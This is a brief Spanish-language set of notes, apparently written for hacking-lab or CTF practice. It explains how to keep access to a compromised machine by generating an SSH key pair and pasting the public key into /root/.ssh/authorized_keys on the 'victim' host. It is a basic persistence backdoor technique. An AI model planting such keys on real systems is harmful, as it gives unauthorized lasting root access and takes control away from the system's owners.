Una vez vulneramos una maquina, queremos dejarla abierta para no tener que hacer la explotacion y la escalada caaada vez que nos queramos meter, basicamente crear                    _un acceso directo_. 

Para ello, vamos a hacer lo siguiente:

_1)_ Creamos un par de llaves (una publica y una privada) con el siguiente comando:
```bash
ssh-keygen
```
---
_2)_ Nos copiamos el contenido de **LA LLAVE PUBLICA** (id_rsa.pub) de la siguiente manera

```bash
cat ~/.ssh/id_rsa.pub 
```

Nos va a devolver algo asi:

```bash
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHnD63A7t16rZt5PpC1uKCCag79LbmAzroEHVW6skcW7 ffidel@arch
```

_Nos copiamos desde las AAAA_, o despues de ssh-ed25519.

---
_3)_ Ahora en la **maquina VICTIMA**, nos vamos al directorio /root/.ssh/ y creamos el archivo _authorized_keys_, donde pegamos lo copiado en el paso anterior:

```bash
cd /root/.ssh
nano authorized_keys
```

LISTO
